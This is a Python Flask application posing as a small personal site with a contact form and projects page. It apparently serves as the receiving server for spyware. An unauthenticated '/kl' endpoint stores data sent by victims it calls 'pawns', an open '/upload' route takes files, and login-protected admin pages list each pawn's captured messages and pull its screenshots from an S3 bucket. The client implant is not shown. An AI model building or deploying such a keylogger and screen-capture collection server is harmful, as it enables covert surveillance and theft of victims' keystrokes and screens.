import os
from flask import (
    render_template,
    request, 
    escape,
    flash,
    redirect,
    url_for,
    jsonify
)
from flask_login import (
    login_required,
    login_user,
    logout_user,
)
from server import (
    login_manager,
    limiter,
    app
)
from config import (
    ProdConfig, 
    DevConfig
)
from models import (
    User,
    Pawn,
)
import boto3
from werkzeug.utils import secure_filename


if os.getenv('ENV') == 'production':
    app.config.from_object(ProdConfig)
elif os.getenv('ENV') == 'development':
    app.config.from_object(DevConfig)
else:
    raise NotImplementedError('** ! ENV not set. **')


@login_manager.user_loader
def load_user(user_id):
    return User.query.get(user_id)


@login_manager.unauthorized_handler
def unauthorized():
    flash('Please log in.', 'info')
    return redirect(url_for('home'))


@app.route('/', methods=['GET', 'POST'])
@limiter.limit('3 per day', methods=['POST'])   # limit only POST of form.
def home():
    if request.method == 'POST':
        email = escape(request.form.get('email'))
        message = escape(request.form.get('message'))

        if not email or not message:
            flash('You need to complete both email and message fields.', 'danger')
            return redirect(url_for('home'))

        flash('Your message has been sent.', 'success')

        return redirect(url_for('home'))
    return render_template('home.html')


@app.route('/soktr')
def soktr():
    return jsonify(on=True)


@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            return jsonify(success=False, message='No file part')
        file = request.files['file']
        if file.filename == '':
            return jsonify(success=False, message='No file part')
        if file:
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config.get('UPLOAD_FOLDER'), filename))
            return jsonify(success=True)
    return jsonify(method='POST only')


@app.route('/projects')
def projects():
    return render_template('projects.html')


@app.route('/kl', methods=['GET', 'POST'])
def kl():
    if request.method == 'POST':
        data = request.json.get('d')
        pawn = request.json.get('p', 'f')
        p_obj = Pawn.query.filter_by(name=pawn).first()
        if p_obj:
            p_obj.add_message(data)
        else:
            p = Pawn(name=pawn)
            p.add_message(data)
        return jsonify(success=True)
    return jsonify(secret=1)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        user_exists = User.query.filter_by(email=email).first()
        if user_exists:
            if user_exists.valid_password(password):
                login_user(user_exists)
                return redirect(url_for('admin'))
            flash('Invalid password.', 'danger')
            return redirect(url_for('login'))
        flash('Invalid email.', 'danger')
        return redirect(url_for('login'))
    return render_template('login.html')


@app.route('/admin/messages/<pawn_id>')
@login_required
def messages(pawn_id):
    pawn = Pawn.query.get(pawn_id)
    msgs = []
    if pawn:
        msgs = sorted(
            pawn.messages[:200],
            key=lambda x: x.timestamp,
            reverse=True
        )
    return render_template('protected/messages.html', messages=msgs, pawn=pawn)


@app.route('/admin/screens/<pawn_id>')
@login_required
def screens(pawn_id):
    pawn = Pawn.query.get(pawn_id)
    files_dict = {}
    if pawn:
        s3 = boto3.client('s3', aws_access_key_id=os.getenv('S3_KEY'), aws_secret_access_key=os.getenv('S3_SECRET_KEY'))
        joscreen = boto3.resource('s3', aws_access_key_id=os.getenv('S3_KEY'),
                                  aws_secret_access_key=os.getenv('S3_SECRET_KEY')).Bucket('joscreen')
        for i in joscreen.objects.filter(Prefix=pawn.name):
            files_dict[i.key] = i.last_modified
            s3.download_file(i.bucket_name, i.key, os.path.join(app.root_path, 'static/temp', i.key))
    return render_template('protected/screenshots.html', pawn_files=sorted(files_dict.items(), key=lambda x: x[1], reverse=True))


@app.route('/admin', methods=['GET', 'POST'])
@login_required
def admin():
    pawns = Pawn.query.all()
    return render_template('protected/admin.html', pawns=pawns)


@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('Bye for now.', 'success')
    return redirect(url_for('home'))


@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404


@app.errorhandler(429)
def page_not_found(e):
    return render_template('too_many_emails.html'), 429


@app.errorhandler(500)
def page_not_found(e):
    return render_template('500.html'), 500


if __name__ == '__main__':
    app.run(port=5000, host='0.0.0.0')